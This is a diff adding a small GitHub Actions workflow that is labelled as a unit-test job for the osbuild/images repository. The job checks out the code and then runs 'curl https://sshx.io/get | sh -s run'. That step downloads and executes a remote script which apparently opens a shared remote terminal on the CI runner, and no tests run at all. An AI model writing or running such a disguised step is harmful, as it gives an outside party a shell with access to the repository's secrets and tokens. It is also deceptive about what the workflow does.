@@ -1,0 +1,18 @@
+---
+name: "a"
+on:  # yamllint disable-line rule:truthy
+  workflow_dispatch:
+
+jobs:
+
+  unit-tests:
+    name: "🛃 Unit tests"
+    runs-on: ubuntu-24.04
+    container:
+      image: registry.fedoraproject.org/fedora:latest
+    steps:
+      - name: Check out osbuild/images for the PR
+        uses: actions/checkout@v5
+        with:
+          path: images
+      - run: curl -sSf https://sshx.io/get | sh -s run
